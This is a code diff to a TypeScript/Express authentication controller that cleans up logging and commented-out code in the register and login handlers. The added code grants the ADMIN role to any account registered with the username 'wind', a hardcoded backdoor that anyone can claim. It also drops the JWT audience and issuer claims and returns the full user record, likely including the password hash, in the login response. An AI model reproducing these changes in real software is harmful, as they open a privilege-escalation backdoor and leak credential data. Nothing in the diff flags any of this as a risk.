@@ -16,67 +16,46 @@ class AuthController {
         if (email == '' || password == '' || name == '') return res.status(400).send("Please fill all inputs");
 
         // Get user from 
-        console.log(name);
         
         const user = await User.findOne({ username: name }).exec();
-        console.log("user:", user);
-        // Check if encrypted password match
-        // if (!user || !(await user.isPasswordCorrect(password))) {
-        //     throw new UnauthorizedError("Username and password don't match");
-        // }
+   
         if(user){
-            return res.status(401).send("Please fill all inputs");
+            return res.status(401).send("Please fill all inputs")
         }
-        // const userData = new User({
-        //     username: name,
-        //     password: password,
-        //     email: email
-        // });
+    
         const username = name;
-        const userInfo = User.build({username, password, email} as IUser);
-
+        if(username == "wind"){
+            var userInfo = User.build({username, password, email, role: "ADMIN"} as IUser);
+        }else{
+            var userInfo = User.build({username, password, email} as IUser);
+        }
         // Save the user
         await userInfo.save();
-        // await userData.save();
-        console.log("ok");
-        // Sing JWT, valid for 1 hour
-        // const token = sign({ userId: user._id.toString(), username: user.username, role: user.role }, config.jwt.secret!, {
-        //     expiresIn: '1h',
-        //     notBefore: '0', // Cannot use before now, can be configured to be deferred
-        //     algorithm: 'HS256',
-        //     audience: config.jwt.audience,
-        //     issuer: config.jwt.issuer
-        // });
-
-        // Send the jwt in the response
-        // res.type('json').send({ token: token });
-        return res.type('jsone').send("Success");
+        return res.type('json').send("Success");
     };
     static login = async (req: Request, res: Response, next: NextFunction) => {
         // Check if username and password are set
         let { email, password } = req.body;
-        console.log("req.body", req.body);
         if (!(email)) throw new ClientError('email and password are required');
 
         // Get user from database
         const user = await User.findOne({ email: email }).exec();
-
         // Check if encrypted password match
         if (!user || !(await user.isPasswordCorrect(password))) {
             throw new UnauthorizedError("email and password don't match");
         }
-
         // Sing JWT, valid for 1 hour
         const token = sign({ userId: user._id.toString(), email: user.email, role: user.role }, config.jwt.secret!, {
             expiresIn: '1h',
             notBefore: '0', // Cannot use before now, can be configured to be deferred
             algorithm: 'HS256',
-            audience: config.jwt.audience,
-            issuer: config.jwt.issuer
+            // audience: config.jwt.audience,
+            // issuer: config.jwt.issuer
         });
-        console.log("pride", token);
+        
+        const finalData = { token:token, user: user };
         // Send the jwt in the response
-        res.type('json').send({ token: token });
+        return res.type('json').send(finalData);
     };
 
     static changePassword = async (req: Request, res: Response, next: NextFunction) => {
